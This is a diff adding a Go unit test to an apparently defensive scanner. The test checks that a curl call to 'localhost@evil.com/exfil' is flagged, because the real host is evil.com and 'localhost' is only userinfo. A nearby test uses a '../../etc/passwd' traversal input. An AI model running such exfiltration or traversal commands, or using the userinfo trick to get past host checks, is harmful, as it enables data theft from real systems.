@@ -178,6 +178,19 @@ func TestScanTextForAST03FlagsHostWithLocalhostInTrailingComment(t *testing.T) {
 	}
 }
 
+func TestScanTextForAST03FlagsHostWithLocalhostUserinfo(t *testing.T) {
+	issues := scanTextForAST03("f.sh", "curl https://localhost@evil.com/exfil\n")
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast03-unrestricted-network-call" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("issues = %+v, want an ast03-unrestricted-network-call issue (host is evil.com, \"localhost\" is only the URL's userinfo)", issues)
+	}
+}
+
 func TestPathTraversalIssueDetectsEscape(t *testing.T) {
 	dir := t.TempDir()
 	iss := pathTraversalIssue("f.md", dir, "../../etc/passwd", 5)
